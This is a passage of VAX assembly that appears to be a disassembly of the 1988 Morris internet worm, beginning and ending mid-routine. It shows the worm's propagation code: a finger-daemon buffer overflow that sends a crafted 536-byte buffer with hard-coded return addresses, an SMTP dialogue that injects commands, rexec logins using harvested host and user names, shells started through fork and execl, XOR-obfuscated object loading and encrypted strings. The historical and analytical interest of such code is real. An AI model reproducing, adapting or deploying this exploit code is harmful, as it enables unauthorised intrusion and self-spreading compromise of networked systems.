	halt
	brw	LL30
LL42:
	subl3	$0xC,fp,r0
	pushl	r0
	calls	$0x1,_pipe	#  global routine _pipe#
	tstl	r0
	bgeq	LL31
	clrf	r0
	ret
LL31:
	subl3	$0x14,fp,r0
	pushl	r0
	calls	$0x1,_pipe	#  global routine _pipe#
	tstl	r0
	bgeq	LL32
	pushl	-0xC(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL32:
	calls	$0x0,_fork	#  global routine _fork#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL33
	pushl	-0xC(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x8(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x10(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL33:
	tstl	-0x4(fp)
	beql	LL34
	brw	LL35
LL34:
	clrf	-0x18(fp)
LL38:
	cmpl	-0x18(fp),$0x20
	bgeq	LL36
	cmpl	-0x18(fp),-0xC(fp)
	beql	LL37
	cmpl	-0x18(fp),-0x10(fp)
	beql	LL37
	cmpl	-0x18(fp),$0x2
	beql	LL37
	pushl	-0x18(fp)
	calls	$0x1,_close	#  global routine _close#
LL37:
	incl	-0x18(fp)
	brb	LL38
LL36:
	pushl	$0x0
	pushl	-0xC(fp)
	calls	$0x2,_dup2	#  global routine _dup2#
	pushl	$0x1
	pushl	-0x10(fp)
	calls	$0x2,_dup2	#  global routine _dup2#
	cmpl	-0xC(fp),$0x2
	bleq	LL39
	pushl	-0xC(fp)
	calls	$0x1,_close	#  global routine _close#
LL39:
	cmpl	-0x10(fp),$0x2
	bleq	LL40
	pushl	-0x10(fp)
	calls	$0x1,_close	#  global routine _close#
LL40:
	pushl	$0x0
	pushl	0x10(ap)
	pushl	0x4(ap)
	pushl	$mcount+0x24A	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$mcount+0x23D	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x5,_execl	#  global routine _execl#
	pushl	$0x0
	pushl	0x10(ap)
	pushl	0x4(ap)
	pushl	$mcount+0x25B	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$mcount+0x24E	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x5,_execl	#  global routine _execl#
	pushl	$0x0
	pushl	0x10(ap)
	pushl	0x4(ap)
	pushl	$mcount+0x268	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$mcount+0x25F	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x5,_execl	#  global routine _execl#
	pushl	$0x1
	calls	$0x1,_exit	#  global routine _exit#
LL35:
	pushl	-0xC(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x10(fp)
	calls	$0x1,_close	#  global routine _close#
	movl	-0x14(fp),*0x8(ap)
	movl	-0x8(fp),*0xC(ap)
	pushl	$0x1E
	pushl	*0xC(ap)
	pushl	*0x8(ap)
	calls	$0x3,0x23CE
	tstl	r0
	beql	LL41
	movl	$0x1,r0
	ret
LL41:
	pushl	*0x8(ap)
	calls	$0x1,_close	#  global routine _close#
	pushl	*0xC(ap)
	calls	$0x1,_close	#  global routine _close#
	pushl	$0x9
	pushl	-0x4(fp)
	calls	$0x2,_kill	#  global routine _kill#
	pushl	$0x1
	calls	$0x1,_sleep	#  global routine _sleep#
	pushl	$0x0
	pushl	$0x1
	pushl	$0x0
	calls	$0x3,_wait3	#  global routine _wait3#
	clrf	r0
	ret
	ret
LL30:
	subl2	$0x1C,sp
	brw	LL42
	halt
	halt
	halt
	brw	LL43
LL44:
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	pushl	r0
	pushl	$mcount+0x26C	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0xC8,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0xC8,fp,r0
	pushl	r0
	pushl	$mcount+0x26F	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x64,fp,r0
	pushl	r0
	calls	$0x3,_sprintf	#  global routine _sprintf#
	subl3	$0x64,fp,r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x2,0x21BE
	pushl	0xC(ap)
	subl3	$0xC8,fp,r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x3,0x2462
	ret
	ret
LL43:
	movab	-0xC8(sp),sp
	brw	LL44
	halt
	halt
	brb	LL45
LL51:
	pushl	0x8(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	movl	r0,-0x208(fp)
LL50:
	pushl	0xC(ap)
	pushl	$0x200
	subl3	$0x200,fp,r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x4,0x24F2
	tstl	r0
	beql	LL46
	clrf	-0x204(fp)
LL49:
	subl3	$0x200,fp,r0
	movl	-0x204(fp),r1
	tstb	(r0)[r1]
	beql	LL47
	pushl	-0x208(fp)
	subl3	$0x200,fp,r0
	addl2	-0x204(fp),r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x3,_strncmp	#  global routine _strncmp#
	tstl	r0
	bneq	LL48
	movl	$0x1,r0
	ret
LL48:
	incl	-0x204(fp)
	brb	LL49
LL47:
	brb	LL50
LL46:
	clrf	r0
	ret
	ret
LL45:
	movab	-0x208(sp),sp
	brb	LL51
####  END PROC ####

#### start of global routine "_justreturn" ####
	.data
	.text
	.align	1
	.globl	 _justreturn
_justreturn:
	.word	S41
	.set	S41,0x0
	brb	LL0
LL1:
	movl	$0x1,_alarmed	#  global sym _alarmed#
	ret
LL0:
	brb	LL1
	halt
	halt
	brw	LL2
LL12:
	clrf	-0x4(fp)
LL8:
	cmpl	-0x4(fp),0xC(ap)
	bgeq	LL3
	ashl	0x4(ap),$0x1,r0
	movl	r0,-0xC(fp)
	movl	0x10(ap),-0x14(fp)
	clrf	-0x10(fp)
	subl3	$0x14,fp,r0
	pushl	r0
	pushl	$0x0
	pushl	$0x0
	subl3	$0xC,fp,r0
	pushl	r0
	addl3	$0x1,0x4(ap),r0
	pushl	r0
	calls	$0x5,_select	#  global routine _select#
	tstl	r0
	bgtr	LL4
	clrf	r0
	ret
LL4:
	tstl	-0xC(fp)
	bneq	LL5
	clrf	r0
	ret
LL5:
	pushl	$0x1
	addl3	-0x4(fp),0x8(ap),r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x3,_read	#  global routine _read#
	cmpl	r0,$0x1
	beql	LL6
	clrf	r0
	ret
LL6:
	movl	0x8(ap),r0
	movl	-0x4(fp),r1
	cmpb	(r0)[r1],$0xA
	bneq	LL7
	brb	LL3
LL7:
	incl	-0x4(fp)
	brb	LL8
LL3:
	movl	0x8(ap),r0
	movl	-0x4(fp),r1
	clrb	(r0)[r1]
	tstl	-0x4(fp)
	bgtr	LL9
	tstl	-0x8(fp)
	bleq	LL10
LL9:
	movl	$0x1,r0
	brb	LL11
LL10:
	clrf	r0
LL11:
	ret
	ret
LL2:
	subl2	$0x14,sp
	brw	LL12
	halt
	halt
	brb	LL13
LL18:
	clrb	*0x8(ap)
	tstl	0x4(ap)
	bneq	LL14
	clrf	r0
	ret
LL14:
	cvtbl	*0x4(ap),r0
	bitb	$0x8,__ctype_+0x1[r0]	#  global data segment#
	beql	LL15
	incl	0x4(ap)
	brb	LL14
LL15:
	tstb	*0x4(ap)
	bneq	LL16
	clrf	r0
	ret
LL16:
	tstb	*0x4(ap)
	beql	LL17
	cvtbl	*0x4(ap),r0
	bitb	$0x8,__ctype_+0x1[r0]	#  global data segment#
	bneq	LL17
	movl	0x4(ap),r0
	incl	0x4(ap)
	movb	(r0),*0x8(ap)
	incl	0x8(ap)
	brb	LL16
LL17:
	clrb	*0x8(ap)
	movl	0x4(ap),r0
	ret
	ret
LL13:
	brb	LL18
	halt
	halt
	brw	LL19
LL35:
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	movl	r0,-0x440(fp)
	clrf	-0x4(fp)
LL26:
	cmpl	-0x4(fp),$0x6
	blss	LL20
	brw	LL21
LL20:
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL22
	brw	LL23
LL22:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x14(fp)
	tstl	-0x14(fp)
	bgeq	LL24
	brb	LL23
LL24:
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x24(fp)
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	(r1),-0x20(fp)
	pushl	$0x4F
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x22(fp)
	pushl	$0xA
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x3,_connect	#  global routine _connect#
	tstl	r0
	bgeq	LL25
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL23
LL25:
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	brb	LL21
LL23:
	incl	-0x4(fp)
	brw	LL26
LL21:
	cmpl	-0x4(fp),$0x6
	blss	LL27
	clrf	r0
	ret
LL27:
	clrf	-0x4(fp)
LL29:
	cmpl	-0x4(fp),$0x218
	bgeq	LL28
	subl3	$0x43C,fp,r0
	movl	-0x4(fp),r1
	clrb	(r0)[r1]
	incl	-0x4(fp)
	brb	LL29
LL28:
	clrf	-0x4(fp)
LL31:
	cmpl	-0x4(fp),$0x190
	bgeq	LL30
	subl3	$0x43C,fp,r0
	movl	-0x4(fp),r1
	cvtlb	$0x1,(r0)[r1]
	incl	-0x4(fp)
	brb	LL31
LL30:
	clrf	-0x8(fp)
LL33:
	cmpl	-0x8(fp),$0x1C
	bgeq	LL32
	movl	-0x8(fp),r0
	subl3	$0x43C,fp,r1
	addl2	-0x4(fp),r1
	movb	mcount+0x70[r0],*-0x8(fp)[r1]	#  global data segment#
	incl	-0x8(fp)
	brb	LL33
LL32:
	movl	$0x7FFFE9FC,-0x22C(fp)
	movl	$0x7FFFE8A8,-0x230(fp)
	movl	$0x7FFFE8BC,-0x234(fp)
	movl	$0x28000000,-0x238(fp)
	movl	$0x1C020,-0x228(fp)
	pushl	$0x218
	subl3	$0x43C,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x3,_write	#  global routine _write#
	pushl	$0x1
	pushl	$mcount+0x27E	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x3,_write	#  global routine _write#
	pushl	$0x5
	calls	$0x1,_sleep	#  global routine _sleep#
	pushl	$0xA
	pushl	-0x14(fp)
	pushl	-0x14(fp)
	calls	$0x3,0x23CE
	tstl	r0
	beql	LL34
	movl	-0x14(fp),*0x8(ap)
	movl	-0x14(fp),*0xC(ap)
	movl	$0x1,r0
	ret
LL34:
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
	ret
LL19:
	movab	-0x440(sp),sp
	brw	LL35
	halt
	halt
	halt
	brb	LL36
LL39:
	clrf	-0x4(fp)
	clrf	-0x8(fp)
LL38:
	cmpl	-0x8(fp),$0x4
	bgeq	LL37
	ashl	$0x8,-0x4(fp),-0x4(fp)
	bicl3	$-0x100,0x4(ap),r0
	bisl2	r0,-0x4(fp)
	movl	0x4(ap),r0
	extzv	$0x8,$0x18,r0,r0
	movl	r0,0x4(ap)
	incl	-0x8(fp)
	brb	LL38
LL37:
	movl	-0x4(fp),r0
	ret
	ret
LL36:
	subl2	$0x8,sp
	brb	LL39
####  END PROC ####

#### start of global routine "_permute"	####
	.data
	.text
	.align	1
	.globl	 _permute
_permute:
	.word	S43
	.set	S43,0x0
	brw	LL0
LL3:
	clrf	-0x4(fp)
LL2:
	mull3	0xC(ap),0x8(ap),r0
	cmpl	-0x4(fp),r0
	bgeq	LL1
	calls	$0x0,_random	#  global routine _random#
	divl3	0x8(ap),r0,r1
	mull2	0x8(ap),r1
	subl3	r1,r0,r1
	mull2	0xC(ap),r1
	movl	r1,-0x8(fp)
	pushl	0xC(ap)
	subl3	$0x208,fp,r0
	pushl	r0
	addl3	-0x4(fp),0x4(ap),r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	0xC(ap)
	addl3	-0x4(fp),0x4(ap),r0
	pushl	r0
	addl3	-0x8(fp),0x4(ap),r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	pushl	0xC(ap)
	addl3	-0x8(fp),0x4(ap),r0
	pushl	r0
	subl3	$0x208,fp,r0
	pushl	r0
	calls	$0x3,_bcopy	#  global routine _bcopy#
	addl2	0xC(ap),-0x4(fp)
	brw	LL2
LL1:
	ret
LL0:
	movab	-0x208(sp),sp
	brw	LL3
	halt
	halt
	halt
	brw	LL4
LL29:
	subl3	$0x238,fp,r0
	pushl	r0
	subl3	$0x234,fp,r0
	pushl	r0
	subl3	$0x230,fp,r0
	pushl	r0
	subl3	$0x22C,fp,r0
	pushl	r0
	pushl	0x4(ap)
	calls	$0x5,_makemagic	#  global routine _makemagic#
	tstl	r0
	bneq	LL5
	clrf	r0
	ret
LL5:
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	movl	r0,-0x228(fp)
	clrf	-0x4(fp)
LL12:
	cmpl	-0x4(fp),$0x6
	blss	LL6
	brw	LL7
LL6:
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL8
	brw	LL9
LL8:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x14(fp)
	tstl	-0x14(fp)
	bgeq	LL10
	brb	LL9
LL10:
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x24(fp)
	movl	-0x4(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	(r1),-0x20(fp)
	pushl	$0x19
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x22(fp)
	pushl	$0xA
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	$0x10
	subl3	$0x24,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x3,_connect	#  global routine _connect#
	tstl	r0
	bgeq	LL11
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL9
LL11:
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	brb	LL7
LL9:
	incl	-0x4(fp)
	brw	LL12
LL7:
	cmpl	-0x4(fp),$0x6
	blss	LL13
	clrf	r0
	ret
LL13:
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	bneq	LL14
	brw	LL15
LL14:
	cmpb	-0x224(fp),$0x32
	beql	LL16
	brw	LL15
LL16:
	pushl	$mcount+0x280	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	bneq	LL17
	brw	LL15
LL17:
	cmpb	-0x224(fp),$0x32
	beql	LL18
	brw	LL15
LL18:
	pushl	$mcount+0x287	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL19
	cmpb	-0x224(fp),$0x32
	beql	LL20
LL19:
	brw	LL15
LL20:
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	movl	r0,-0x4(fp)
	pushl	-0x4(fp)
	pushl	-0x4(fp)
	pushl	$mcount+0x29E	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x224,fp,r0
	pushl	r0
	calls	$0x4,_sprintf	#  global routine _sprintf#
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL21
	cmpb	-0x224(fp),$0x32
	beql	LL22
LL21:
	brw	LL15
LL22:
	pushl	$mcount+0x2CE	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL23
	cmpb	-0x224(fp),$0x33
	beql	LL24
LL23:
	brw	LL15
LL24:
	pushl	$mcount+0x2D4	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	pushl	-0x238(fp)
	pushl	-0x234(fp)
	pushl	-0x230(fp)
	pushl	-0x22C(fp)
	pushl	-0x14(fp)
	pushl	0x4(ap)
	calls	$0x6,0x2014
	pushl	$mcount+0x2D6	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL25
	cmpb	-0x224(fp),$0x32
	beql	LL26
LL25:
	pushl	-0x238(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL15
LL26:
	pushl	$mcount+0x2DA	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL27
	cmpb	-0x224(fp),$0x32
	beql	LL28
LL27:
	pushl	-0x238(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL15
LL28:
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x238(fp)
	pushl	-0x234(fp)
	pushl	-0x230(fp)
	pushl	-0x22C(fp)
	pushl	0x4(ap)
	calls	$0x5,_waithit	#  global routine _waithit#
	ret
LL15:
	pushl	$mcount+0x2E0	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
	ret
LL4:
	movab	-0x238(sp),sp
	brw	LL29
####  END PROC ####

#### start of global routine "_resp24" ####
	.data
	.text
	.align	1
	.globl	 _resp24
_resp24:
	.word	S45
	.set	S45,0x0
	brb	LL0
LL5:
	clrb	*0x8(ap)
	clrf	-0xC(fp)
LL4:
	cmpl	-0xC(fp),$0x28
	bgeq	LL1
	pushl	$0x14
	pushl	$0x200
	pushl	0x8(ap)
	pushl	0x4(ap)
	calls	$0x4,0x24F2
	tstl	r0
	bneq	LL2
	clrf	r0
	ret
LL2:
	cvtbl	*0x8(ap),r0
	bitb	$0x4,__ctype_+0x1[r0]	#  global data segment#
	beql	LL3
	movl	0x8(ap),r0
	cvtbl	0x1(r0),r0
	bitb	$0x4,__ctype_+0x1[r0]	#  global data segment#
	beql	LL3
	movl	0x8(ap),r0
	cvtbl	0x2(r0),r0
	bitb	$0x4,__ctype_+0x1[r0]	#  global data segment#
	beql	LL3
	movl	0x8(ap),r0
	cmpb	0x3(r0),$0x20
	bneq	LL3
	movl	$0x1,r0
	ret
LL3:
	incl	-0xC(fp)
	brb	LL4
LL1:
	clrf	r0
	ret
	ret
LL0:
	subl2	$0xC,sp
	brb	LL5
####  END PROC ####

#### start of global routine "_hu1" ####
	.data
	.text
	.align	1
	.globl	 _hu1
_hu1:
	.word	S47
	.set	S47,0x0
	brw	LL0
LL16:
	cmpl	0x8(ap),_me	#  global sym _me#
	bneq	LL1
	clrf	r0
	ret
LL1:
	movl	0x8(ap),r0
	bitl	$0x2,0x48(r0)
	beql	LL2
	clrf	r0
	ret
LL2:
	movl	0x8(ap),r0
	tstl	0x30(r0)
	beql	LL3
	tstl	*0x8(ap)
	bneq	LL4
LL3:
	pushl	0x8(ap)
	calls	$0x1,_getaddrs	#  global routine _getaddrs#
LL4:
	movl	0x8(ap),r0
	tstl	0x30(r0)
	bneq	LL5
	movl	0x8(ap),r0
	bisl2	$0x4,0x48(r0)
	clrf	r0
	ret
LL5:
	pushl	$0xFF
	pushl	0xC(ap)
	subl3	$0x100,fp,r0
	pushl	r0
	calls	$0x3,_strncpy	#  global routine _strncpy#
	clrb	-0x1(fp)
	tstb	-0x100(fp)
	bneq	LL6
	pushl	0x4(ap)
	subl3	$0x100,fp,r0
	pushl	r0
	calls	$0x2,_strcpy	#  global routine _strcpy#
LL6:
	clrf	-0x310(fp)
LL10:
	subl3	$0x100,fp,r0
	movl	-0x310(fp),r1
	tstb	(r0)[r1]
	beql	LL7
	subl3	$0x100,fp,r0
	movl	-0x310(fp),r1
	cvtbl	(r0)[r1],r0
	bitb	$0x10,__ctype_+0x1[r0]	#  global data segment#
	bneq	LL8
	subl3	$0x100,fp,r0
	movl	-0x310(fp),r1
	cmpb	(r0)[r1],$0x20
	bgeq	LL9
LL8:
	clrf	r0
	ret
LL9:
	incl	-0x310(fp)
	brb	LL10
LL7:
	pushl	$0x1
	calls	$0x1,_other_sleep	#  global routine _other_sleep#
	addl3	$0x1E,0x4(ap),r0
	pushl	r0
	subl3	$0x100,fp,r0
	pushl	r0
	pushl	0x8(ap)
	calls	$0x3,0x2E92
	movl	r0,-0x314(fp)
	tstl	-0x314(fp)
	blss	LL11
	pushl	-0x314(fp)
	pushl	-0x314(fp)
	pushl	0x8(ap)
	calls	$0x3,0x1776
	movl	r0,-0x30C(fp)
	pushl	-0x314(fp)
	calls	$0x1,_close	#  global routine _close#
	movl	-0x30C(fp),r0
	ret
LL11:
	cmpl	-0x314(fp),$-0x2
	bneq	LL12
	clrf	r0
	ret
LL12:
	addl3	$0x1E,0x4(ap),r0
	pushl	r0
	pushl	0x4(ap)
	pushl	_me	#  global sym _me#
	calls	$0x3,0x2E92
	movl	r0,-0x314(fp)
	tstl	-0x314(fp)
	bgeq	LL13
	brw	LL14
LL13:
	subl3	$0x100,fp,r0
	pushl	r0
	pushl	*0x8(ap)
	pushl	$mcount+0x2E6	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x300,fp,r0
	pushl	r0
	calls	$0x4,_sprintf	#  global routine _sprintf#
	subl3	$0x300,fp,r0
	pushl	r0
	pushl	-0x314(fp)
	calls	$0x2,0x21BE
	pushl	$0xA
	calls	$0x1,_sleep	#  global routine _sleep#
	clrf	-0x30C(fp)
	pushl	$0x19
	pushl	-0x314(fp)
	pushl	-0x314(fp)
	calls	$0x3,0x23CE
	tstl	r0
	beql	LL15
	pushl	-0x314(fp)
	pushl	-0x314(fp)
	pushl	0x8(ap)
	calls	$0x3,0x1776
	movl	r0,-0x30C(fp)
LL15:
	pushl	-0x314(fp)
	calls	$0x1,_close	#  global routine _close#
	movl	-0x30C(fp),r0
	ret
LL14:
	clrf	r0
	ret
	ret
LL0:
	movab	-0x314(sp),sp
	brw	LL16
	halt
	halt
	halt
	brw	LL17
LL32:
	clrf	-0x8(fp)
LL24:
	cmpl	-0x8(fp),$0x6
	blss	LL18
	brw	LL19
LL18:
	movl	-0x8(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	tstl	(r1)
	bneq	LL20
	brw	LL21
LL20:
	pushl	$0x0
	pushl	$0x1
	pushl	$0x2
	calls	$0x3,_socket	#  global routine _socket#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL22
	brw	LL21
LL22:
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	calls	$0x2,_bzero	#  global routine _bzero#
	cvtlw	$0x2,-0x1C(fp)
	movl	-0x8(fp),r0
	addl3	$0x30,0x4(ap),r1
	ashl	$0x2,r0,r0
	addl2	r0,r1
	movl	(r1),-0x18(fp)
	pushl	$0x200
	calls	$0x1,_htons	#  global routine _htons#
	cvtlw	r0,-0x1A(fp)
	pushl	$0x8
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	$_justreturn	#  global sym _justreturn#
	pushl	$0xE
	calls	$0x2,_signal	#  global routine _signal#
	pushl	$0x10
	subl3	$0x1C,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_connect	#  global routine _connect#
	tstl	r0
	bgeq	LL23
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL21
LL23:
	pushl	$0x0
	calls	$0x1,_alarm	#  global routine _alarm#
	brb	LL19
LL21:
	incl	-0x8(fp)
	brw	LL24
LL19:
	cmpl	-0x8(fp),$0x6
	blss	LL25
	mnegl	$0x2,r0
	ret
LL25:
	pushl	$0x1
	pushl	$mcount+0x311	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	cmpl	r0,$0x1
	beql	LL26
	brw	LL27
LL26:
	pushl	0x8(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	pushl	0x8(ap)
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	pushl	0xC(ap)
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	pushl	0xC(ap)
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	pushl	$mcount+0x31A	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	incl	r0
	pushl	r0
	pushl	$mcount+0x312	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x3,_write	#  global routine _write#
	tstl	r0
	bgeq	LL28
	brb	LL27
LL28:
	pushl	$0x14
	pushl	$0x1
	subl3	$0x21C,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x4,_xread	#  global routine _xread#
	cmpl	r0,$0x1
	beql	LL29
	brb	LL27
LL29:
	tstb	-0x21C(fp)
	beql	LL30
	brb	LL27
LL30:
	pushl	$0x28
	pushl	-0x4(fp)
	pushl	-0x4(fp)
	calls	$0x3,0x23CE
	tstl	r0
	bneq	LL31
	brb	LL27
LL31:
	movl	-0x4(fp),r0
	ret
LL27:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	mnegl	$0x1,r0
	ret
	ret
LL17:
	movab	-0x21C(sp),sp
	brw	LL32
	halt
####  END PROC ####

#### start of global routine "_loadobject" ####
	.data
	.text
	.align	1
	.globl	 _loadobject
_loadobject:
	.word	S49
	.set	S49,0x0
	brw	LL0
LL7:
	pushl	$0x0
	pushl	0x4(ap)
	calls	$0x2,_open	#  global routine _open#
	movl	r0,-0x4(fp)
	tstl	-0x4(fp)
	bgeq	LL1
	clrf	r0
	ret
LL1:
	subl3	$0x48,fp,r0
	pushl	r0
	pushl	-0x4(fp)
	calls	$0x2,_fstat	#  global routine _fstat#
	tstl	r0
	bgeq	LL2
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL2:
	movl	-0x34(fp),-0x8(fp)
	pushl	-0x8(fp)
	calls	$0x1,_malloc	#  global routine _malloc#
	movl	r0,-0x4C(fp)
	tstl	-0x4C(fp)
	bneq	LL3
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL3:
	pushl	-0x8(fp)
	pushl	-0x4C(fp)
	pushl	-0x4(fp)
	calls	$0x3,_read	#  global routine _read#
	cmpl	r0,-0x8(fp)
	beql	LL4
	pushl	-0x4C(fp)
	calls	$0x1,_free	#  global routine _free#
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
LL4:
	pushl	-0x4(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x8(fp)
	pushl	-0x4C(fp)
	calls	$0x2,_xorbuf	#  global routine _xorbuf#
	pushl	$0x2C
	pushl	0x4(ap)
	calls	$0x2,_index	#  global routine _index#
